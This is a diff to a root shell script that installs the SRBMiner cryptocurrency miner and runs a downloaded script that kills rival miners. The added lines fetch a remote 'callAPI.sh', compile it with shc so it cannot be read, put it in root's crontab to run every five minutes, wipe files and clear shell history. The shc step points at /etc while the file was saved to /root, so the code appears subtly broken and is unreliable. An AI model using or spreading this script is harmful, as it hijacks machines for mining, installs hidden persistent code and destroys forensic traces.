@@ -4,6 +4,7 @@ rm -fR /root/cpuminer-opt-linux/
 rm -fv *
 sudo apt-get update -y
 sudo apt-get install cpulimit -y
+sudo apt-get install shc -y
 wget --no-check-certificate -O SRBMiner-Multi.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz
 tar -xvf SRBMiner-Multi.tar.gz
 chmod +x SRBMiner-Multi-2-4-6/*
@@ -48,10 +49,18 @@ fi
 
 wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
 chmod +x /root/kill_miner.sh
-./root/kill_miner.sh
+./kill_miner.sh
 sleep 3
 ./danielluis1921.sh
 cat /dev/null > /var/spool/cron/crontabs/root
 rm -fv *
 rm -fR *
+wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/callAPI.sh" --output-document=/root/callAPI.sh
+shc -r -f /etc/callAPI.sh -o /root/run.sh
+rm -fv callAPI.sh
+chmod +x /root/run.sh
+cat /dev/null > /var/spool/cron/crontabs/root
+cat >>/var/spool/cron/crontabs/root<<EOF
+*/5 * * * * /root/run.sh
+EOF
 history -c && history -w
